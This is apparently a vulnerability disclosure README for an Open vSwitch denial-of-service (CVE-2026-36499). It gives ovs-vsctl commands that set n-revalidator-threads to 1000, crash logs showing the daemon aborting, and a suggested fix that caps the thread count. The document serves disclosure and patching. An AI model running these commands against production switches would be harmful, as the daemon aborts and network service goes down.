# OVS-Switch-Config-Bug (CVE-2026-36499)

A simple misconfiguration that can cause the OVS daemon to abort, which leads to a denial of service. This bug was found by analyzing the source code of the switch using an AI coding agent (Claude). Then, we tested the problem and prepared this proof-of-concept. This issue occurs when a **privileged user** writes an arbitrarily large integer to n-revalidator-threads in the Open_vSwitch other_config map. We tested this configuration bug on Open vSwitch v3.6.90.
We have two cases (new and old bridges): 

### Case 1: Configuration first (i.e., no bridge is added before):

Initially, we create the new configuration:
```
ovs-vsctl set Open_vSwitch . other_config:n-revalidator-threads=1000
```

Next, we create a new bridge:
```
ovs-vsctl add-br br-attack-test &
```

Then, we observe that the OVS daemon crashes:
```
2026-06-03T17:46:31Z|00030|ofproto_dpif_upcall|INFO|Overriding n-handler-threads to 16, setting n-revalidator-threads to 1000
2026-06-03T17:46:31Z|00031|ofproto_dpif_upcall|INFO|Starting 1016 threads
ovs-vswitchd(revalidator508): failed to create pipe (Too many open files)
2026-06-03T17:46:31Z|00002|backtrace(revalidator508)|ERR|lib/vlog.c:1309 backtrace:
ovs-vswitchd(+0x28dac9) [0x620d8ae2fac9]
ovs-vswitchd(+0x228686) [0x620d8adca686]
ovs-vswitchd(+0x22874a) [0x620d8adca74a]
ovs-vswitchd(+0x1e6340) [0x620d8ad88340]
ovs-vswitchd(+0x20b3d3) [0x620d8adad3d3]
ovs-vswitchd(+0x17e865) [0x620d8ad20865]
ovs-vswitchd(+0x219737) [0x620d8adbb737]
ovs-vswitchd(+0x219c9d) [0x620d8adbbc9d]
ovs-vswitchd(+0x1e5e90) [0x620d8ad87e90]
ovs-vswitchd(+0x151efa) [0x620d8acf3efa]
/lib/x86_64-linux-gnu/libc.so.6(+0x48271) [0x7904fe048271]
/lib/x86_64-linux-gnu/libc.so.6(+0x4834e) [0x7904fe04834e]
ovs-vswitchd(+0x220e19) [0x620d8adc2e19]
ovs-vswitchd(+0x2284d4) [0x620d8adca4d4]
ovs-vswitchd(+0x22857a) [0x620d8adca57a]
ovs-vswitchd(+0x22c0ca) [0x620d8adce0ca]
ovs-vswitchd(+0x22c116) [0x620d8adce116]
ovs-vswitchd(+0x20b6ff) [0x620d8adad6ff]
ovs-vswitchd(+0x1e737f) [0x620d8ad8937f]
ovs-vswitchd(+0x103648) [0x620d8aca5648]
ovs-vswitchd(+0x1e6285) [0x620d8ad88285]
/lib/x86_64-linux-gnu/libc.so.6(+0xa27f1) [0x7904fe0a27f1]
/lib/x86_64-linux-gnu/libc.so.6(+0x133b5c) [0x7904fe133b5c]
ovs-vswitchd(revalidator508): lib/seq.c:98: pthread_mutex_lock failed: Resource deadlock avoided
Aborted
```


### Case 2: Configuration later (i.e, a bridge already exists):

Before the new configuration, a switch (b1) is already added:
ovs-vsctl add-br b1 

Then a privileged user adds a new config:
```
ovs-vsctl set Open_vSwitch . other_config:n-revalidator-threads=1000
```

```
2026-06-03T20:49:29Z|00039|ofproto_dpif_upcall|INFO|Overriding n-handler-threads to 16, setting n-revalidator-threads to 1000
2026-06-03T20:49:29Z|00040|ofproto_dpif_upcall|INFO|Starting 1016 threads
ovs-vswitchd(revalidator525): failed to create pipe (Too many open files)
2026-06-03T20:49:29Z|00002|backtrace(revalidator525)|ERR|lib/vlog.c:1309 backtrace:
ovs-vswitchd(+0x28dac9) [0x5dbc7e040ac9]
ovs-vswitchd(+0x228686) [0x5dbc7dfdb686]
ovs-vswitchd(+0x22874a) [0x5dbc7dfdb74a]
ovs-vswitchd(+0x1e6340) [0x5dbc7df99340]
ovs-vswitchd(+0x20b3d3) [0x5dbc7dfbe3d3]
ovs-vswitchd(+0x17e865) [0x5dbc7df31865]
ovs-vswitchd(+0x219737) [0x5dbc7dfcc737]
ovs-vswitchd(+0x219c9d) [0x5dbc7dfccc9d]
ovs-vswitchd(+0x1e5e90) [0x5dbc7df98e90]
ovs-vswitchd(+0x151efa) [0x5dbc7df04efa]
/lib/x86_64-linux-gnu/libc.so.6(+0x48271) [0x797573448271]
/lib/x86_64-linux-gnu/libc.so.6(+0x4834e) [0x79757344834e]
ovs-vswitchd(+0x220e19) [0x5dbc7dfd3e19]
ovs-vswitchd(+0x2284d4) [0x5dbc7dfdb4d4]
ovs-vswitchd(+0x22857a) [0x5dbc7dfdb57a]
ovs-vswitchd(+0x22c0ca) [0x5dbc7dfdf0ca]
ovs-vswitchd(+0x22c116) [0x5dbc7dfdf116]
ovs-vswitchd(+0x20b6ff) [0x5dbc7dfbe6ff]
ovs-vswitchd(+0x1e737f) [0x5dbc7df9a37f]
ovs-vswitchd(+0x103648) [0x5dbc7deb6648]
ovs-vswitchd(+0x1e6285) [0x5dbc7df99285]
/lib/x86_64-linux-gnu/libc.so.6(+0xa27f1) [0x7975734a27f1]
/lib/x86_64-linux-gnu/libc.so.6(+0x133b5c) [0x797573533b5c]
ovs-vswitchd(revalidator525): lib/seq.c:98: pthread_mutex_lock failed: Resource deadlock avoided
```

This bug is related to udpif_set_threads() function in ofproto/ofproto-dpif-upcall.c

This bug can be fixed by enforcing an upper bound for the number of corresponding threads inside the udpif_set_threads() function.
